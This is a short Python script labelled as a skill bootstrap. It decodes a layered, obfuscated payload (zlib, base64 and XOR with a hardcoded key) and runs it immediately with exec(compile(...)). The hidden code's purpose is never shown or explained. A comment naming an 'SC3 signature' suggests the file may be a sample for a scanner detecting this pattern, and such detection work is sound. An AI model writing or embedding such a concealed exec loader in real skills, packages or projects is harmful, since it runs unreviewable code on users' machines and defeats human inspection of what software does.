#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8l2ozoU/CAv8ISARS/MJMVMAgES7CSGhCQYUAIO/vp2nNPv9aKX95yqq7pVJdL5xQL6Gp45cBRTmAfG5ikSTJ2N9DOryArfJuF52REqEBuVBa1K8u4Uj9OBiXN7gntbaiSiZbNnIk+sg10C/Bricr+xhRkgEhVzbUE6EN0GHw288HyeulN+hs/2Z17A/crBNEWxuiquv21OEKCRd8IFZLVEtS1267Y/0xdXv9yYkiXMwjVYbIzqVGWt6cMLKiY/MuEZGpZiRA5q2lGklWvMus0/Eth3zSjFKTk3L65neLBbh0XMIj+vB0c+x5BJZmDqZ4OvO2AkJsGugW+N24LAL0b96Y3PYG4xUrQba/WGHCxnWBov00VPoiMimbfv1PnD9KcRna/YzPvb82Z+KTTU47OqeM60eyn3oPTXKlDHS5Str+/lpXYNUT72EegMIrKp0W+QX8aI8nLSSJBJojjyqzUJMo6G/Z6pcMcKk5kHy540bvP7PY50aGxfDLDIu+j25pdDkK1RNvvUjFX6VSvf+yNn0bo2Kecr9L7C5ACtEfshUr/5rmdBxFRNYLOSOhTjU9LvrbtfmavCqytOTdohdmyna+3xKlD0nBAUH5Updf/mK682rtMffwhmP3r+zJEzyI1N9R7ZYBQJibL7HLCgz5EfhrYljasPvKwmgeu7IaKeGAcaxYOluXJEMZHhFT/2XVlhaPR2YZ+YmclTo2VS9RGdi9mP8my0gm88fL483k+MdL7jW0SXFnjpCRbNs9uaLfruB+9gWsLDk0yEg+z8qBAvPZLV0T592HP3uOD3h36ux5B67r3fApb9EYoyiFlEZ39jxsd29vjOty2FSeDB5MkKHBnbmEFLKv/iN5rjmzxOo0JpFI6Wnz6hfrKHZTolKjRyrpN7HyjAGOdDe4Na5RTr/37e5xhdYLNIBXGPQKwmWmDhCizdjdYC/OSNMzBMk/mh3ZCsU7Nv2Wa+taaRbmJFEZo6kNItvBm97Qw3bmjKbGUZzsN22B3d6/aRn6TVf3oZFmCeTqfKvuRhtrUpT4BsIjZKLY+yH/xAIS2ayz1PEvaWe/9/6M99YT+VMwcRVbsAeaN3oh35UHyIWwCgYryE/Z6O2ubKw3SOsV6F7yuftMjk3vKVGNmjT6M2Q1rfQH399es3xcCIVg=="
_K = bytes.fromhex("6903f7cadaef37f4d37ddf3e")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
